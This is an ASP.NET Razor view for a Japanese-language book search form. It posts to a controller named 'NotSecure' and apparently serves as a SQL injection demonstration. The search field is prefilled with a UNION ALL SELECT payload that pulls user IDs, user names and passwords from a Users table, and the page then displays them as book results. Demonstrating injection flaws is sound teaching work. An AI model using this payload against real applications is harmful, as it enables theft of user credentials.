@model BookListModel

<form asp-controller="NotSecure" asp-action="Post" method="post">
    検索ワード
    <input type="text" id="key_word" name="key_word" value="' union all select user_id as book_id, user_name as title, password as author from Users; -- " width="100" />
    <button type="submit">検索</button>
</form>

<table>
    <tr>
        <th width="80">Id</th>
        <th width="80">タイトル</th>
        <th width="80">著者</th>
    </tr>
    @foreach (var book in Model.BookList) {
        <tr>
            <td>@book.BookId</td>
            <td>@book.Title</td>
            <td>@book.Author</td>
        </tr>
    }
</table>